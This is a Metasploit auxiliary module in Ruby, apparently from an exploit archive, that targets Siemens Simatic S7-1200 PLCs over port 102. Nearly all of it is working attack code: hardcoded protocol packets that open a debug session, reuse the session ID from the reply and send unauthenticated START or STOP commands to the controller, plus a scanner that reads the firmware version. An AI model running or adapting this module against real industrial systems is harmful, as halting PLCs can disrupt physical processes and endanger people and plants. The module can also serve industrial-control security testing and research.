# Exploit Title:  Simatic S7 1200 CPU command module
# Date: 15-12-2015
# Exploit Author: Nguyen Manh Hung
# Vendor Homepage: http://www.siemens.com/
# Tested on: Siemens Simatic S7-1214C
# CVE : None
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Scanner
	def initialize(info = {})
		super(update_info(info,
			'Name'=> 'Simatic S7-1200 CPU START/STOP Module',
			'Description'   => %q{
				Update 2015
				The Siemens Simatic S7-1200 S7 CPU start and stop functions over ISO-TSAP.
			},
			'Author'      => 'Nguyen Manh Hung <tdh.mhung@gmail.com>',
			'License'           => MSF_LICENSE,
			'References'     =>
				[
					[ 'nil' ],
				],
			'Version'        => '$Revision$',
			'DisclosureDate' => '11-2015'
			))

			register_options(
				[
					Opt::RPORT(102),
					OptInt.new('FUNC',[true,'func',1]),
					OptString.new('MODE', [true, 'Mode select:
					START -- start PLC
					STOP  -- stop PLC
					SCAN  -- PLC scanner',"SCAN"]),
				], self.class)
	end
####################################################################################
	def packet()
		packets=[		#dua tren TIA portal thay cho hello plc
						"\x03\x00\x00\x23\x1e\xe0\x00\x00"+
						"\x00\x06\x00\xc1\x02\x06\x00\xc2"+
						"\x0f\x53\x49\x4d\x41\x54\x49\x43"+
						"\x2d\x52\x4f\x4f\x54\x2d\x45\x53"+
						"\xc0\x01\x0a",

                 		#session debug
               			"\x03\x00\x00\xc0\x02\xf0\x80\x72"+
               			"\x01\x00\xb1\x31\x00\x00\x04\xca"+
               			"\x00\x00\x00\x02\x00\x00\x01\x20"+
               			"\x36\x00\x00\x01\x1d\x00\x04\x00"+
               			"\x00\x00\x00\x00\xa1\x00\x00\x00"+
               			"\xd3\x82\x1f\x00\x00\xa3\x81\x69"+
               			"\x00\x15\x16\x53\x65\x72\x76\x65"+
               			"\x72\x53\x65\x73\x73\x69\x6f\x6e"+
               			"\x5f\x43\x43\x39\x43\x33\x39\x33"+
               			"\x44\xa3\x82\x21\x00\x15\x0b\x31"+
               			"\x3a\x3a\x3a\x36\x2e\x30\x3a\x3a"+
               			"\x3a\x12\xa3\x82\x28\x00\x15\x0d"+
               			"\x4f\x4d\x53\x2b\x20\x44\x65\x62"+
               			"\x75\x67\x67\x65\x72\xa3\x82\x29"+
               			"\x00\x15\x00\xa3\x82\x2a\x00\x15"+
               			"\x00\xa3\x82\x2b\x00\x04\x84\x80"+
               			"\x80\x80\x00\xa3\x82\x2c\x00\x12"+
               			"\x11\xe1\xa3\x00\xa3\x82\x2d\x00"+
               			"\x15\x00\xa1\x00\x00\x00\xd3\x81"+
               			"\x7f\x00\x00\xa3\x81\x69\x00\x15"+
               			"\x15\x53\x75\x62\x73\x63\x72\x69"+
               			"\x70\x74\x69\x6f\x6e\x43\x6f\x6e"+
               			"\x74\x61\x69\x6e\x65\x72\xa2\xa2"+
               			"\x00\x00\x00\x00\x72\x01\x00\x00",

						######
						"\x03\x00\x00\x77\x02\xf0\x80\x72"+#p1
						"\x02\x00\x68\x31\x00\x00\x05\x42"+
						"\x00\x00\x00\x03\x00\x00\x03\xff"+
						"\x34\x00\x00\x03\xff\x01\x01\x82"+
						"\x32\x01\x00\x17\x00\x00\x01\x3a"+
						"\x82\x3b\x00\x04\x81\x40\x82\x3c"+
						"\x00\x04\x81\x40\x82\x3d\x00\x04"+
						"\x00\x82\x3e\x00\x04\x84\x80\xc0"+
						"\x40\x82\x3f\x00\x15\x00\x82\x40"+
						"\x00\x15\x05\x32\x3b"+
						"\x35\x34\x34\x82\x41"+
						"\x00\x03\x00\x03\x00\x00\x00\x00"+#2
						"\x04\xe8\x89\x69\x00\x12\x00\x00"+
						"\x00\x00\x89\x6a\x00\x13\x00\x89"+
						"\x6b\x00\x04\x00\x00\x00\x00\x00"+
						"\x00\x72\x02\x00\x00",
						#unknown
                		"\x03\x00\x00\x07\x02\xf0\x00",
                		#bat dau qua trinh diag
                		"\x03\x00\x00\x2b\x02\xf0\x80\x72"+
                		"\x02\x00\x1c\x31\x00\x00\x04\xbb"+
                		"\x00\x00\x00\x05\x00\x00\x03\xff"+
                		"\x34\x00\x00\x00\x01\x00\x00\x00"+
                		"\x00\x00\x00\x00\x00\x00\x00\x72"+
                		"\x02\x00\x00",
                		#tiep tuc diag
                		"\x03\x00\x00\x2b\x02\xf0\x80\x72"+
                		"\x02\x00\x1c\x31\x00\x00\x04\xbb"+
                		"\x00\x00\x00\x06\x00\x00\x03\xff"+
                		"\x34\x00\x00\x00\x02\x00\x01\x01"+
                		"\x00\x00\x00\x00\x00\x00\x00\x72"+
                		"\x02\x00\x00",
#truoc start-stop
                		"\x03\x00\x00\x42\x02\xf0\x80"+
                		"\x72\x02\x00\x33\x31\x00\x00\x04"+
                		"\xfc\x00\x00\x00\x07\x00\x00\x03"+
                		"\xff\x36\x00\x00\x00\x34\x02\x91"+
                		"\x3d\x9b\x1e\x00\x00\x04\xe8\x89"+
                		"\x69\x00\x12\x00\x00\x00\x00\x89"+
                		"\x6a\x00\x13\x00\x89\x6b\x00\x04"+
                		"\x00\x00\x00\x00\x00\x00\x00\x72"+
                		"\x02\x00\x00",
#start
						"\x03\x00\x00\x43\x02\xf0\x80"+
                		"\x72\x02\x00\x34\x31\x00\x00\x04"+
                		"\xf2\x00\x00\x00\x08\x00\x00\x03"+
                		"\xff\x36\x00\x00\x00\x34\x01\x90"+
                		"\x77\x00\x08\x03\x00\x00\x04\xe8"+
                		"\x89\x69\x00\x12\x00\x00\x00\x00"+
                		"\x89\x6a\x00\x13\x00\x89\x6b\x00"+
                		"\x04\x00\x00\x00\x00\x00\x00\x00"+
                		"\x72\x02\x00\x00",
#stop
						"\x03\x00\x00\x43\x02\xf0\x80"+
                		"\x72\x02\x00\x34\x31\x00\x00\x04"+
                		"\xf2\x00\x00\x00\x08\x00\x00\x03"+
                		"\xff\x36\x00\x00\x00\x34\x01\x90"+
                		"\x77\x00\x08\x01\x00\x00\x04\xe8"+
                		"\x89\x69\x00\x12\x00\x00\x00\x00"+
                		"\x89\x6a\x00\x13\x00\x89\x6b\x00"+
                		"\x04\x00\x00\x00\x00\x00\x00\x00"+
                		"\x72\x02\x00\x00",
			]
		return packets
	end
#############################################################################
	def start_PLC(scr)
		print_good "mode select: START"
		sock.put(packet[6].gsub("\xff",[scr].pack("c")))#send hello plc
		sock.get_once()
		sleep(0.05)
		sock.put(packet[7].gsub("\xff",[scr].pack("c")))#send hello plc
		#sock.get_once()
		dt=sock.get_once(-1, sock.def_read_timeout)
		if dt.length.to_i == 30
			print_good "PLC---->RUN"
		else
			a= dt.to_s.gsub(/[\x80-\xff]/," ")
			print_error a.to_s.gsub(/[\x00-\x30]/," ")
		end
	end
#############################################################################
	def stop_PLC(scr)
		print_good "mode select: STOP"
		sock.put(packet[6].gsub("\xff",[scr].pack("c")))#send hello plc
		sock.get_once()
		sleep(0.05)
		sock.put(packet[8].gsub("\xff",[scr].pack("c")))#send hello plc
		dt=sock.get_once(-1, sock.def_read_timeout)
		if dt.length.to_i == 30
			print_good "PLC---->STOP"
		else
			a= dt.to_s.gsub(/[\x80-\xff]/," ")
			print_error a.to_s.gsub(/[\x00-\x30]/," ")
		end
	end
#############################################################################
	def PLC_SCAN(ip)
		sock.put(packet[0])#send hello plc
		sock.get_once()
		sleep(0.05)
		sock.put(packet[1])#xin 1 session debug
		dt=sock.get_once(-1, sock.def_read_timeout)
		sock.put(packet[3])#send hello plc
		sock.get_once()
		arr=dt.split(/;/)
		print_good "#{ip.to_s}:  #{arr[2].to_s} : #{arr[3][0..3].to_s}"
	end
#############################################################################
	def run_host(ip)
		mode=datastore['MODE']
		func=datastore['FUNC']
		connect()
		if mode !="scan" && mode!="SCAN"
			sock.put(packet[0])#send hello plc
			sock.get_once()
			sleep(0.05)
			sock.put(packet[1])#xin 1 session debug
			dt=sock.get_once(-1, sock.def_read_timeout)
			sock.put(packet[3])#send hello plc
			sock.get_once()
			arr=dt.split(/;/)
			print_good "#{arr[2].to_s} : #{arr[3][0..3].to_s}"
			data=dt.unpack("C*")
			a= (data[24]).to_i
			b= (data[26]).to_i
			scr=a|128
			scr1=b|128
			#print_line scr.to_s
			if arr.length.to_i ==5 #neu lay duoc session
				session_i= arr[4][0..4].each_byte.map { |dt| '\x%02x' % dt.to_i }.join
				pac=packet[2].gsub("\xff",[scr].pack("c"))
				sock.put(pac.gsub("\x35\x34\x34\x82\x41", arr[4][0..4]))
			end
			sock.put(packet[3])#send uknown packet to plc
			sock.get_once()
			case mode
				when "START" , "start"
					start_PLC(scr)
				when "STOP" , "stop"
					stop_PLC(scr)
				else
					print_error("Invalid MODE")
			end
		else
			PLC_SCAN(ip)
		end
		disconnect()
	end
end